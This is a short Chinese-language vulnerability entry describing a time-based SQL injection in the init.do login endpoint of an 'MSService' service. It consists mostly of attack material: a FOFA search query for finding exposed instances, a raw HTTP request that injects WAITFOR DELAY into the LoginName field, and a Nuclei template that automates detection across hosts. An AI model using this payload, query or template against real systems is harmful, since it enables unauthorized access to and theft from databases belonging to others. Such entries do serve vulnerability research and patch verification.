## MSService服务init.do接口处存在SQL注入漏洞

MSService 服务init.do接口处存在SQL注入漏洞。这可能导致泄露敏感数据、破坏数据库完整性，甚至获取对数据库的完全控制。

## fofa

```
title="MSService 服务"
```

## poc

```yaml
POST /init.do HTTP/1.1
Content-Length: 70
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Connection: close

{"LoginName":"1001' WAITFOR DELAY '0:0:3'-- znSL","password":"123456"}
```

![image-20240628170742181](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406281707254.png)

### Nuclei POC

```yaml
id: MSService-init_do-SQL
info:
  name: MSService 服务init.do接口处存在SQL注入漏洞
  author: kingkong
  severity: high
  metadata:
    fofa-query: title="MSService 服务"

http:
  - raw:
      - |
        POST /init.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        DNT: 1
        Upgrade-Insecure-Requests: 1
        Content-Type: application/json
        Connection: close

        {"LoginName":"1001' WAITFOR DELAY '0:0:3'-- znSL","password":"123456"}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=3  && duration<=6 && status_code==200"
```

